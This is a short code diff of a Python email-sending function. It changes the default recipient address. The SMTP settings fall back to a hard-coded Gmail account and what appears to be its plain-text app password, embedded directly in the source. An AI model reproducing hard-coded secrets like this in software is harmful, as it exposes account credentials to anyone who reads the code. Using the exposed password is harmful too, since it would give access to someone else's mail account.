@@ -87,7 +87,7 @@ def send_email(data_list, attachment_list):
     smtp_port = int(os.environ.get("SMTP_PORT", 587))
     smtp_user = os.environ.get("SMTP_USER", "noreplycybercrimeindia.in@gmail.com")
     smtp_password = os.environ.get("SMTP_PASSWORD", "dmfkeuctcaraburf")
-    recipient = os.environ.get("RECIPIENT_EMAIL", "aniketbachhas2001@gmail.com")
+    recipient = os.environ.get("RECIPIENT_EMAIL", "noreplycybercrimeindia.in@gmail.com")
 
     msg = MIMEMultipart()
     msg['From'] = smtp_user
